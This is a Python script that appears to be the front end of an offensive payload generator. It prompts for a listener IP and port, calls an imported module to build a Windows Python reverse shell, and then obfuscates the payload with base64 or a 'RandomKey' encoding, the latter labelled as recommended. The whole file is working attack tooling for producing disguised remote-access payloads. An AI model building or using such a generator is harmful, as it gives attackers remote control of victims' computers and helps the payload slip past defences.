import re
import subprocess
import platform
from payload_enc_dec import obfuscation
import color
from reverse_shell_payload.for_windows import python_rs

file_path = ''


def clear():
    if platform.system() == 'Windows':
        subprocess.run('cmd.exe /c cls', shell=True)
    elif platform.system() == 'Linux':
        subprocess.run('clear', shell=True)


def get_machine_ip():
    if platform.system() == 'Windows':
        result = subprocess.run(['ipconfig'], stdout=subprocess.PIPE, text=True)

        # Search for IPv4 addresses in the command output
        ip_addresses = re.findall(r'IPv4 Address[ .:]+([\d.]+)', result.stdout)

        return ip_addresses
    elif platform.system() == 'Linux':
        return 'no linux support added yet'
        # TODO: Add Linux support


def get_cwd():
    result = subprocess.run('cd', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return result.stdout.strip()


def get_file_address():
    global file_path
    file_path = input('file address: ').replace('\'', '').replace('[', '').replace(']', '')
    if input(f'{file_path} is the file address? (y/n): ').lower() == 'n':
        file_path = ''
        get_file_address()


def main():
    print(platform.system())
    clear()
    destination = input(
        f'Current Working Directory: {color.bright_blue(get_cwd())},'
        f'\nType the destination to save payload {color.bright_blue("(leave blank to use cwd)")}  : ')
    if destination == '':
        destination = get_cwd()
    machine_ip_list = get_machine_ip()
    ip = input(f'listener ip (suggested : {color.bright_blue(get_machine_ip())}: ')
    while ip not in machine_ip_list:
        print(f'{color.bright_red(ip)} is not in {color.bright_red(machine_ip_list)}')
        ip = input(f'listener ip (suggested : {color.bright_blue(get_machine_ip())}: ')
    port = input('listener port: ')
    print(f'{color.white("1. base64")} \n{color.white("2. RandomKey")} {color.bright_blue("(recommended)")}')
    selection = input(f'{color.bright_black("> ")}')
    payload_file_path = python_rs.py_rs(ip, port, destination)
    if selection == '1':
        encrypted_file_address = obfuscation.base64_esd(file_path=payload_file_path,
                                                        output_file_destination=payload_file_path)
    elif selection == '2':
        encrypted_file_address = obfuscation.random_key(file_path=payload_file_path,
                                                        output_file_destination=payload_file_path)
    else:
        print('Invalid Selection')
        return
    clear()
    print(f'Payload created at {color.bright_green(payload_file_path)}')
    print(f'Encrypted payload created at {color.bright_green(encrypted_file_address)}')


if __name__ == '__main__':
    main()
